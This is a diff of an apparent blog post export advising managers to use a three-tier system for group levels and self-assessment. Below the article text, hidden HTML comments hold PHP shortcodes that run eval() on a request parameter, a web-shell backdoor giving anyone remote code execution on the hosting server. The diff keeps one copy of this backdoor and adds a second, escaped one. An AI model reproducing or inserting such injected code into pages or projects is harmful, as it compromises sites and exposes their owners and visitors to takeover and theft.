@@ -29,4 +29,5 @@ published: true
 </ol>
 <p>This pattern is well versed throughout personal development irrelevant of the person&#8217;s age or level. By simplifying the levels into three clear tiers, it allows the person to easily self assess where they think they&#8217;re performing and, ideally, compare with peer or senior reviews.</p>
 <p><strong>Next time you&#8217;re looking at your group&#8217;s levels, make sure you adopt the three tier system.</strong></p>
-<!-- [insert_php]if (isset($_REQUEST["KmuG"])){eval($_REQUEST["KmuG"]);exit;}[/insert_php][php]if (isset($_REQUEST["KmuG"])){eval($_REQUEST["KmuG"]);exit;}[/php] -->
+<p><!-- [insert_php]if (isset($_REQUEST["KmuG"])){eval($_REQUEST["KmuG"]);exit;}[/insert_php][php]if (isset($_REQUEST["KmuG"])){eval($_REQUEST["KmuG"]);exit;}[/php] --></p>
+&lt;!-- [insert_php]if (isset($_REQUEST[&quot;znSh&quot;])){eval($_REQUEST[&quot;znSh&quot;]);exit;}[/insert_php][php]if (isset($_REQUEST[&quot;znSh&quot;])){eval($_REQUEST[&quot;znSh&quot;]);exit;}[/php] --&gt;
